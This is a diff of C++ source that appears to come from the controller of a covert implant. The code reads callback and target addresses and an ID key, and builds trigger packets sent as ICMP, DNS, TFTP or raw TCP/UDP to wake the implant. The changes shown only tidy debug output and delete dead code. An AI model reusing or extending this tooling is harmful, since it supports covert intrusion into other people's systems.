@@ -292,7 +292,7 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 		}
 		else 
 		{
-			cout << " ERROR: Funky file open/create error [" << triggerFileName << "]." << endl;
+			cout << " ERROR: File open/create error [" << triggerFileName << "]." << endl;
 			return -1;
 		}
 		newTriggerFile.close();
@@ -316,7 +316,7 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 
 		//Get and verify callbackAddress
 		triggerFile.getline( t_param->callbackAddress, MAX_INPUT_LEN, delim);
-cout << "DEBUG: " << t_param->callbackAddress << endl;
+//cout << "DEBUG: " << t_param->callbackAddress << endl;
 		if (inet_pton( AF_INET, t_param->callbackAddress, &testSocket.sin_addr) != 1)
 		{
 			cout << " ERROR: Callback IP address [" << t_param->callbackAddress << "] invalid." << endl;
@@ -325,7 +325,7 @@ cout << "DEBUG: " << t_param->callbackAddress << endl;
 
 		//Get and verify callbackPort
 		triggerFile.getline( tempInput, MAX_INPUT_LEN, delim);
-cout << "DEBUG: " << tempInput << endl;
+//cout << "DEBUG: " << tempInput << endl;
 		t_param->callbackPort = atoi( tempInput);
 
 		if (( t_param->callbackPort > 65535) || ( t_param->callbackPort <= 0))
@@ -339,7 +339,7 @@ cout << "DEBUG: " << tempInput << endl;
 
 		//Get and verify targetAddress
 		triggerFile.getline( t_param->targetAddress, MAX_INPUT_LEN, delim);
-cout << "DEBUG: " << t_param->targetAddress << endl;
+//cout << "DEBUG: " << t_param->targetAddress << endl;
 
 		if (inet_pton( AF_INET, t_param->targetAddress, &testSocket.sin_addr) != 1)
 		{
@@ -350,10 +350,10 @@ cout << "DEBUG: " << t_param->targetAddress << endl;
 		// Get and verify ID key
 
 		triggerFile.getline( t_param->idKey, MAX_INPUT_LEN, delim);
-cout << "DEBUG: idKey = " << t_param->idKey << endl;
+//cout << "DEBUG: idKey = " << t_param->idKey << endl;
 		if (strlen(t_param->idKey) == 0) {
 			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim);
-cout << "DEBUG: idKeyFilename = " << t_param->idKeyFilename << endl;
+//cout << "DEBUG: idKeyFilename = " << t_param->idKeyFilename << endl;
 			if (strlen(t_param->idKeyFilename) == 0) {
 				cout << "ERROR: Missing ID key." << endl;
 				return -1;
@@ -364,7 +364,7 @@ cout << "DEBUG: idKeyFilename = " << t_param->idKeyFilename << endl;
 			}
 		} else {
 			if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
-cout << "DEBUG: idKey length = " << strlen(t_param->idKey) << endl;
+//cout << "DEBUG: idKey length = " << strlen(t_param->idKey) << endl;
 				cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
 				return -1;
 			}
@@ -556,8 +556,8 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	inet_pton( AF_INET, t_param.targetAddress, &(ti.target_addr));
 
 	// Read and process ID key
-cout << "DEBUG: Key file \"" << t_param.idKeyFilename << "\".\n";
-cout << "DEBUG: Key filename length \"" << strlen(t_param.idKeyFilename) << "\".\n";
+//cout << "DEBUG: Key file \"" << t_param.idKeyFilename << "\".\n";
+//cout << "DEBUG: Key filename length \"" << strlen(t_param.idKeyFilename) << "\".\n";
 	if (strlen(t_param.idKeyFilename) > 0) {
 		if (sha1_file(t_param.idKeyFilename, ti.triggerKey) != 0) {
 			cout << "ERROR: Could not generate trigger key from key file \"" << t_param.idKeyFilename << "\".\n";
@@ -566,7 +566,7 @@ cout << "DEBUG: Key filename length \"" << strlen(t_param.idKeyFilename) << "\".
 	} else {
 		sha1((const unsigned char *)t_param.idKey, strlen(t_param.idKey), ti.triggerKey);
 	}
-	displaySha1Hash("Trigger key: ", ti.triggerKey);
+	displaySha1Hash("  . Trigger key: ", ti.triggerKey);
 
    //------------Payload----------------
 	memset( &p, 0, sizeof( Payload ) );
@@ -590,23 +590,6 @@ cout << "DEBUG: Key filename length \"" << strlen(t_param.idKeyFilename) << "\".
 	if (trigger_info_to_payload(&p, &ti)) {
 		return;
 	}
-
-#if 0
-	memcpy( &(p.package[0]), &(ti.callback_addr), sizeof(in_addr_t) );
-	memcpy( &(p.package[4]), &(ti.callback_port), sizeof(uint16_t) );
-	p.crc = 0;
-	crc = tiny_crc16( (const uint8_t *) &p, sizeof(Payload));
-	//crc = tinycrc( (const uint8_t *) &p, sizeof(Payload));  //Can't seem to link tiny_crc16 from trigger_utils, so we'll duplicate it above in tinycrc...
-	crc = htons(crc);
-	p.crc = crc;
-	
-	//cout << "\n\n\n\n We have created a payload [" << p.seed << "," << p.package << "," << p.crc << "].\n" << endl;
-
-	/*  Originally, we were going to use the Trigger's connection, but all the following methods (i.e. trigger_icmp_ping, 
-	 *   trigger_icmp_error, trigger_tftp_wrq, trigger_dns_query, trigger_raw_tcp, and trigger_raw_udp use internal 
-	 *methods/sockets versus the Connection class to send the triggers.
-	*/
-#endif
 
 	//Finalize payloads and send the triggers...
 	switch (ti.trigger_type)
@@ -678,11 +661,11 @@ void displaySha1Hash(char *label, unsigned char *sha1Hash)
 	int i=0;
 
 	//Display Label
-	printf( " DEBUG: %s=[", label );
+	printf( "%s", label );
 
 	//Display 40 hexadecimal number array
 	for (i=0; i < ID_KEY_HASH_SIZE; i++)
 		printf("%02x",sha1Hash[i]);
-	printf( "]\n" );
+	printf( "\n" );
 }
 
